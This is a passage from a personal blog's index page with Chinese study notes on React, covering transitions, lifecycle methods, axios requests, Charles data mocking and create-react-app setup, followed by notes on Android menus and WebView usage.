class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">								&lt;/</span>CSSTransition&gt;</span><br><span class="line">                            )</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                &lt;<span class="regexp">/TransitionGroup&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;button onClick=&#123;this.handleAddItem&#125;&gt;tonggle&lt;button&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>Fragment&gt;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    handleAddItem()&#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(<span class="function">(<span class="params">prevState</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                list:[...prevState.list,<span class="string">"item"</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就实现了多个元素的动画了。</p>
<hr>
<p>本笔记参考慕课网视频<a href="https://coding.imooc.com/class/229.html" target="_blank" rel="noopener">https://coding.imooc.com/class/229.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/29/react中的css/" data-id="ck55it3mh0030cglr83m4morx" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-react生命周期函数" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/29/react生命周期函数/" class="article-date">
  <time datetime="2018-08-29T15:01:16.000Z" itemprop="datePublished">2018-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/29/react生命周期函数/">react生命周期函数</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="react生命周期函数"><a href="#react生命周期函数" class="headerlink" title="react生命周期函数"></a>react生命周期函数</h2><h3 id="1、什么是生命周期函数"><a href="#1、什么是生命周期函数" class="headerlink" title="1、什么是生命周期函数"></a>1、什么是生命周期函数</h3><p>生命周期函数是指组件在某一刻会自动执行的函数</p>
<ul>
<li><p>1、初始化initialization</p>
<blockquote>
<p>在组件创建时，被执行的函数；进行props和state的设置，可以放在constructor函数中</p>
</blockquote>
</li>
<li><p>2、挂载mounting</p>
<blockquote>
<p>当组件被挂载的时候执行，该周期包括如下</p>
<ul>
<li>componentWillMount：组件被挂载之前执行，通常组件只会挂载一次</li>
<li>render：组件被渲染，可执行多次</li>
<li>componentDidMount：组件被挂载之后执行，通常组件只会挂载一次</li>
</ul>
</blockquote>
</li>
<li><p>3、更新update</p>
<blockquote>
<p>包括props和state更新</p>
<ul>
<li><p>3.1 props</p>
<blockquote>
<ul>
<li>componentWillReceiveProps</li>
</ul>
<p>一个组件从父组件接受参数，只要父组件的render函数被重新执行了，子组件的这个生命周期函数就会被执行。</p>
<p>如果这个组件第一次存在于父组件中，不会执行；</p>
<p>如果这个之前已经存在于父组件中，才会执行</p>
<ul>
<li><p>shouldComponentUpdate:返回true则继续执行，返回false则下一步不执行</p>
</li>
<li><p>componentWillUpdate</p>
</li>
<li><p>render</p>
</li>
<li><p>componeneDidUpdate</p>
</li>
</ul>
</blockquote>
</li>
<li><p>3.2 state</p>
<blockquote>
<ul>
<li><p>shouldComponentUpdate:返回true则继续执行，返回false则下一步不执行</p>
</li>
<li><p>componentWillUpdate</p>
</li>
<li><p>render</p>
</li>
<li><p>componeneDidUpdate</p>
</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
</li>
<li><p>4、卸载unmounting </p>
<blockquote>
<p>当一个组件即将被从页面剔除的时候，执行</p>
<p>componentWillUnmount:</p>
</blockquote>
</li>
</ul>
<p>注意：每个组件都存在生命周期函数</p>
<h3 id="2、生命周期函数使用场景"><a href="#2、生命周期函数使用场景" class="headerlink" title="2、生命周期函数使用场景"></a>2、生命周期函数使用场景</h3><p>生命周期函数中，除了render之外，都可以不存在。</p>
<p>这是由于react中所有的组件都是继承自React.Component，在Component中内置了所有的其余生命周期函数，唯独没有内置render函数的实现。</p>
<h4 id="2-1-shouldComponentUpdate性能提升"><a href="#2-1-shouldComponentUpdate性能提升" class="headerlink" title="2.1 shouldComponentUpdate性能提升"></a>2.1 shouldComponentUpdate性能提升</h4><p>在todolistdemo中，当我们在input中输入东西时，都是都会同时更新input组件和所有的子组件item。之前我们讲过组件重新渲染的条件时state或props变化时，回重新渲染；但是现在item的数据并没有变化，为啥为跟着父组件重新渲染呢？这是因为父组件的render函数执行时，子组件的render都会被执行，这样就会造成很多无谓的渲染，如何避免这种情况呢？</p>
<p>这时shouldComponentUpdate就派上了用场，在内部直接返回false，就可以实现，该组件只在挂载时执行一次，而不会随着数据的更新再次渲染</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shouldComponentUpdate()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//此时该组件不会随着数据的更新而发生重新渲染</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样强制返回，简单暴力，不是很合适，可以根据实际情况来判断，当我们用到的数据真的发生改变时就返回true，否则就返回false。可以根据shouldComponentUpdate函数的两个参数来判断</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在渲染时我们只用到了state中的content的内容</span></span><br><span class="line">shouldComponentUpdate(nextProps,nextState)&#123;</span><br><span class="line">    <span class="keyword">if</span>(nextProps.content!==<span class="keyword">this</span>.props.content)&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就提升了我们组件的性能，减少了无谓的组件渲染。</p>
<p>目前为止，我们讲到提升react的性能的方式有以下几种了</p>
<blockquote>
<p>1、将自定义函数与this的绑定，放在构造函数中</p>
<p>2、标签的key值不能使用index</p>
<p>3、使用shouldComponentUpdate，避免无效的组件渲染</p>
</blockquote>
<h4 id="2-2-react发生ajax请求"><a href="#2-2-react发生ajax请求" class="headerlink" title="2.2 react发生ajax请求"></a>2.2 react发生ajax请求</h4><p>如果我们需要在组件中发送ajax请求，这个请求该放在什么地方呢？比如我们要请求我们要展示多少条，如果放在render中，那么随着render函数的多次调用，ajax请求也会被执行多次。如何让这个ajax请求只执行一次呢？</p>
<p>这时componentDidMount就派上了用场，因为这个函数只会在组件被挂载之后执行一次，之后就不会再被执行了。componentWillMount也有此作用，但是如果放在componentWillMount中可能会与后期的高级技术发生冲突（不再详述），所以不放这里。</p>
<p>react并没有封装ajax请求，此时我们可以使用第三方的框架，axios</p>
<blockquote>
<p>1、首先通过控制台，进入项目目录todolist，</p>
<p>2、输入 yarn add axios，此时就能将axios载入到项目之中了</p>
<p>3、在TodoList组件中，引入axios </p>
<p><code>import axios from &#39;axios&#39;</code></p>
<p>4、在componentDidMount中发送请求</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; componentDidMount()&#123;</span><br><span class="line">&gt;     axios.get(<span class="string">'/spi/todolist'</span>)</span><br><span class="line">&gt;         .then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;alert(<span class="string">'success'</span>)&#125;)<span class="comment">//成功</span></span><br><span class="line">&gt;         .catch(<span class="function"><span class="params">()</span>=&gt;</span>&#123;alert(<span class="string">'error'</span>)&#125;);<span class="comment">//失败</span></span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="2-3-使用charles实现本地数据的mock"><a href="#2-3-使用charles实现本地数据的mock" class="headerlink" title="2.3 使用charles实现本地数据的mock"></a>2.3 使用charles实现本地数据的mock</h4><p>当前开发模式都是前后端分离，为了方便测试需要进行数据的模拟，这就是mock。而charles就可以实现这种模拟。如何模拟呢？参考下面步骤</p>
<blockquote>
<p>1、首先下载charles</p>
<p>2、在桌面创建模拟数据todolist.json，在里面填写要模拟的数据</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; [<span class="string">"react"</span>,<span class="string">"vue"</span>,<span class="string">"webgl"</span>]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>3、打开cahrles工具：tools -&gt; Map Loacal</p>
<p>进行url（localhost:3000/api/todolist）的配置即可，并且map到桌面上指定的todolist.json文件</p>
<p>4、然后进入刷新我们的页面，之前的请求就可以得到数据了</p>
<p>5、在componentDidMount中对ajax请求的结果进行处理，setState即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; componentDidMount()&#123;</span><br><span class="line">&gt;     axios.get(<span class="string">'/spi/todolist'</span>)</span><br><span class="line">&gt;         .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">&gt;             <span class="keyword">this</span>.setState(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">&gt;                 <span class="keyword">return</span>  &#123;</span><br><span class="line">&gt;                     list:res.data</span><br><span class="line">&gt;                 &#125;</span><br><span class="line">&gt;             &#125;);</span><br><span class="line">&gt;     	&#125;)<span class="comment">//成功</span></span><br><span class="line">&gt;         .catch(<span class="function"><span class="params">()</span>=&gt;</span>&#123;alert(<span class="string">'error'</span>)&#125;);<span class="comment">//失败</span></span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//或者这么简写</span></span><br><span class="line">&gt; componentDidMount()&#123;</span><br><span class="line">&gt; 		    axios.get(<span class="string">'/api/todolist'</span>)</span><br><span class="line">&gt; 		        .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">&gt;                 		<span class="comment">//小括号即表示return</span></span><br><span class="line">&gt; 		        		<span class="keyword">this</span>.setState(<span class="function"><span class="params">()</span>=&gt;</span>(&#123;<span class="attr">list</span>:[...res.data]&#125;));</span><br><span class="line">&gt; 		        &#125;)<span class="comment">//成功</span></span><br><span class="line">&gt; 		        .catch(<span class="function"><span class="params">()</span>=&gt;</span>&#123;alert(<span class="string">'error'</span>)&#125;);<span class="comment">//失败</span></span><br><span class="line">&gt; 		&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>如此就实现了ajax请求，并且和组件建立关系</p>
</blockquote>
<p>charles可以抓到浏览器对外的一些请求，作为代理服务器</p>
<hr>
<p>本笔记参考慕课网视频<a href="https://coding.imooc.com/class/229.html" target="_blank" rel="noopener">https://coding.imooc.com/class/229.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/29/react生命周期函数/" data-id="ck55it3lf001scglrr30tzbvd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-react环境安装" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/29/react环境安装/" class="article-date">
  <time datetime="2018-08-29T14:55:47.000Z" itemprop="datePublished">2018-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/29/react环境安装/">react环境安装</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一、React-开发环境的准备"><a href="#一、React-开发环境的准备" class="headerlink" title="一、React 开发环境的准备"></a>一、React 开发环境的准备</h2><h3 id="1、引入-js文件来使用React"><a href="#1、引入-js文件来使用React" class="headerlink" title="1、引入.js文件来使用React"></a>1、引入.js文件来使用React</h3><h3 id="2、使用脚手架工具来编码"><a href="#2、使用脚手架工具来编码" class="headerlink" title="2、使用脚手架工具来编码"></a>2、使用脚手架工具来编码</h3><ul>
<li>GRUNT</li>
<li>GULP</li>
<li>Webpack</li>
<li>Create-react-app（官方推荐的脚手架工具）</li>
</ul>
<p>但是使用脚手架写的内容不能被浏览器直接识别，需要脚手架工具做代码的编译，才能被浏览器运行。</p>
<h2 id="二、安装create-react-app"><a href="#二、安装create-react-app" class="headerlink" title="二、安装create-react-app"></a>二、安装create-react-app</h2><p>如果你的node版本为6.0及以上，可以使用以下命令：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app	<span class="comment">//安装脚手架工具create-react-app</span></span><br><span class="line">create-react-app my-app		<span class="comment">//使用脚手架生成工程my-app</span></span><br><span class="line">cd my-app		<span class="comment">//进入my-app工程</span></span><br><span class="line">npm run start		<span class="comment">//入启动my-app工程</span></span><br></pre></td></tr></table></figure>
<p>如果你的npm版本为5.2.0及以上，可以使用以下命令</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app my-app</span><br><span class="line">cd my-app		<span class="comment">//进入my-app工程</span></span><br><span class="line">npm start		<span class="comment">//入启动my-app工程</span></span><br></pre></td></tr></table></figure>
<h2 id="三、工程目录简介"><a href="#三、工程目录简介" class="headerlink" title="三、工程目录简介"></a>三、工程目录简介</h2><ul>
<li><p>package.json  //任何一个脚手架工具中都会有一哥package.json文件。它代表node的一个包文件，包括项目介绍和一些依赖的包.</p>
<p>只所以能通过npm 润 start来启动工程服务，是因为package.json文件中有</p>
<p>  “script”:{</p>
<pre><code>&quot;start&quot;:&quot;react-scripts start&quot;
//...
</code></pre><p>  }</p>
</li>
<li><p>node_modules //第三方的模块</p>
</li>
<li><p>public</p>
<p>​    favicon.ico //网页标签栏的icon</p>
<p>​    index.html //首页模版</p>
<p>​    mainfest.json </p>
</li>
<li><p>src //源码文件</p>
<p>​    registerserviceWorker //PWA progressive web application，在https服务器访问过，即使断网仍旧可以再访问的功能</p>
</li>
<li><p>。。。</p>
</li>
</ul>
<h2 id="四、React-组件"><a href="#四、React-组件" class="headerlink" title="四、React 组件"></a>四、React 组件</h2><p>组件就是页面上的一部分、</p>
<h3 id="1、定义react组件"><a href="#1、定义react组件" class="headerlink" title="1、定义react组件"></a>1、定义react组件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">    <span class="comment">//render返回什么，就展示什么</span></span><br><span class="line">    render()&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React form <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">const</span> Component= React.Component;</span><br></pre></td></tr></table></figure>
<h3 id="2、ReactDOM"><a href="#2、ReactDOM" class="headerlink" title="2、ReactDOM"></a>2、ReactDOM</h3><p>这是一个第三方的模块，它有一个方法叫render，该方法可以帮助把一个组件挂载到dom节点上</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将APP组件渲染到root标签中 </span></span><br><span class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">APP</span> /&gt;</span>, document.getElementById('root'));</span></span><br><span class="line"><span class="xml">//<span class="tag">&lt;<span class="name">APP</span> /&gt;</span>是jsx语法，</span></span><br><span class="line"></span><br><span class="line">//包括组件中render()方法内返回的`&lt;div&gt;`也是jsx语法，都得通过引入React才能使用</span><br><span class="line">import React from 'react';</span><br></pre></td></tr></table></figure>
<h3 id="3、jsx语法"><a href="#3、jsx语法" class="headerlink" title="3、jsx语法"></a>3、jsx语法</h3><p>自定定义的组件，可以直接通过jsx标签来使用，比如上面的<code>&lt;APP /&gt;</code></p>
<p>注意：组件的命名必须是大写字母开头，</p>
<p>一般大写字符开头都是jsx组件，小写字母开头的标签都是h5的标签</p>
<hr>
<p>本笔记参考慕课网视频<a href="https://coding.imooc.com/class/229.html" target="_blank" rel="noopener">https://coding.imooc.com/class/229.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/29/react环境安装/" data-id="ck55it3ld001qcglrnpqqcowk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-android-menu" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/24/android-menu/" class="article-date">
  <time datetime="2018-01-24T13:06:30.000Z" itemprop="datePublished">2018-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/24/android-menu/">Android之menu的使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="一、如何给一个activity设置menu"><a href="#一、如何给一个activity设置menu" class="headerlink" title="一、如何给一个activity设置menu"></a>一、如何给一个activity设置menu</h3><p>1、在<code>res</code>目录下新建名为<code>menu</code>的文件夹；<br>2、在<code>menu</code>文件夹下新建一个名为<code>main</code>的 <code>Menu resource file</code>文件<br>3、在<code>main</code>文件中添加两个item，其中<code>android:title</code>表示名称；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns</span> <span class="attr">android</span>=<span class="string">"http:/schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/add_item"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">"添加"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/remove_item"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">"删除"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>4、在相应的activity文件中重写<code>onCreateOptionMenu()</code>方法，其中<code>getMenuInflater()</code>方法得到MenuInflater对象，inflate方法创建菜单，第一个参数是指定的资源文件，第二个参数指定菜单项添加到哪一个Menu对象中；返回<code>true</code>表示允许创建的菜单显示出来，false表示无法显示。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionMenu</span><span class="params">(Menu menu)</span></span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main,menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5、定义菜单响应事件，重写<code>onOptionsItemSelected()</code>方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public boolean onOptionsItemSelected(MenuItem item)&#123;</span><br><span class="line">    switch(item.getItemId())&#123;</span><br><span class="line">        case R.id.add_item:</span><br><span class="line">            //...</span><br><span class="line">            break;</span><br><span class="line">        case R.id.remove_item:</span><br><span class="line">            //...</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这时运行程序，在相应的activity页面右侧就会出现一个三点符号了，即菜单按钮。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/24/android-menu/" data-id="ck55it3kw000zcglrfbb2e9xe" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-android-webview" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/24/android-webview/" class="article-date">
  <time datetime="2018-01-24T13:04:52.000Z" itemprop="datePublished">2018-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/24/android-webview/">Android-WebView</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="一、为什么要用WebView"><a href="#一、为什么要用WebView" class="headerlink" title="一、为什么要用WebView"></a>一、为什么要用WebView</h3><ul>
<li>兼容已有项目</li>
<li>可以动态更新</li>
<li>缺点：耗电、加载慢、发热</li>
</ul>
<h3 id="二、WebView的使用"><a href="#二、WebView的使用" class="headerlink" title="二、WebView的使用"></a>二、WebView的使用</h3><ul>
<li>1、在AndroidMainfest.xml中添加网络权限，</li>
<li>2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明</li>
</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WebView webView=(WebView)findViewById(R.id.webView);</span><br><span class="line">webView.loadUrl(&quot;http://www.baidu.com&quot;);</span><br><span class="line">webView.setWebChromeClient(new WebChromeClient()&#123;</span><br><span class="line">	@Override</span><br><span class="line">  public void onReceivedTitle(WebView view,String title)&#123;</span><br><span class="line">  	super.onReceivedTitle(view,title);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="三、自定义WebView-的Title"><a href="#三、自定义WebView-的Title" class="headerlink" title="三、自定义WebView 的Title"></a>三、自定义WebView 的Title</h3><p>如何在加载页面时显示url信息呢？</p>
<ul>
<li>首先在activity_main.xml文件中添加一个表头的配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;RelativeLayout</span><br><span class="line">		andorid:id=&quot;@+id/web_title&quot;</span><br><span class="line">		android:layout_width=&quot;match_parent&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;50dip&quot;&gt;</span><br><span class="line">	  &lt;Button</span><br><span class="line">	   android:id=&quot;@+id/back&quot;</span><br><span class="line">	   android:layout_alignParentLeft=&quot;true&quot;</span><br><span class="line">	  	android:text=&quot;返回&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;40dip&quot;&gt;</span><br><span class="line">	  </span><br><span class="line">	  &lt;TextView</span><br><span class="line">	   android:id=&quot;@+id/title&quot;</span><br><span class="line">	   android:layout_centerInParent=&quot;true&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;wrap_content&quot;&gt;</span><br><span class="line">	  </span><br><span class="line">	  &lt;Button</span><br><span class="line">	   android:id=&quot;@+id/refresh&quot;</span><br><span class="line">	   android:layout_alignParentRight=&quot;true&quot;</span><br><span class="line">	  	android:text=&quot;刷新&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;40dip&quot;&gt;</span><br><span class="line">&lt;RelativeLayout&gt;</span><br><span class="line">&lt;WebView</span><br><span class="line">		andorid:id=&quot;@+id/webView&quot;</span><br><span class="line">		android:layout_width=&quot;match_parent&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;match_parent&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>然后在activity中写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Button back=(Button)findViewById(R.id.back);</span><br><span class="line">Button refresh=(Button)findViewById(R.id.refresh);</span><br><span class="line"></span><br><span class="line">TextView titleView=(TextView)findViewById(R.id. title);</span><br><span class="line"></span><br><span class="line">webView.setWebChromeClient(new WebChromeClient()&#123;</span><br><span class="line"> 	@Override</span><br><span class="line">   public void onReceivedTitle(WebView view,String title)&#123;</span><br><span class="line">   titleView.setText(title);</span><br><span class="line">   	super.onReceivedTitle(view,title);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> back.setOnClickListener(new MyListener());</span><br><span class="line"> refresh.setOnClickListener(new MyListener());</span><br><span class="line"> </span><br><span class="line"> class MyListener implements View.OnClickListener&#123;</span><br><span class="line"> 	@Override</span><br><span class="line"> 	public void onClick(View view)&#123;</span><br><span class="line"> 		switch(view.getId())&#123;</span><br><span class="line"> 			case R.id.back:</span><br><span class="line"> 				//刷新</span><br><span class="line"> 				webView.reload();</span><br><span class="line"> 				break;</span><br><span class="line"> 			case R.id.refresh:</span><br><span class="line"> 				finish();</span><br><span class="line"> 				break;</span><br><span class="line"> 			default:</span><br><span class="line"> 				break;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="四、利用WebView下载文件"><a href="#四、利用WebView下载文件" class="headerlink" title="四、利用WebView下载文件"></a>四、利用WebView下载文件</h3><p>若要使浏览器可以下载文件，需要让webView实现一个接口</p>
